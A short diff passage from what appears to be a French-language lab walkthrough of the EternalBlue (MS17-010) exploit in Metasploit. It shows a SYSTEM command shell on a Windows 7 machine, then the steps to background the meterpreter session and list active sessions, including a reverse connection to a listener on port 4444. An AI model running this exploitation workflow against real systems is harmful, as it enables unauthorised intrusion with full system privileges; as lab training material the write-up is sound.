@@ -268,3 +268,21 @@ Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32>
+```
+
+Ctrl-C pour sortir 
+
+revenir en background sur MSF et explorer les sessions en cours
+```
+meterpreter > background (ou Ctrl-Z) 
+[*] Backgrounding session 1...
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.8.237.162:4444 -> 10.10.214.31:49199 (10.10.214.31)
+```
+
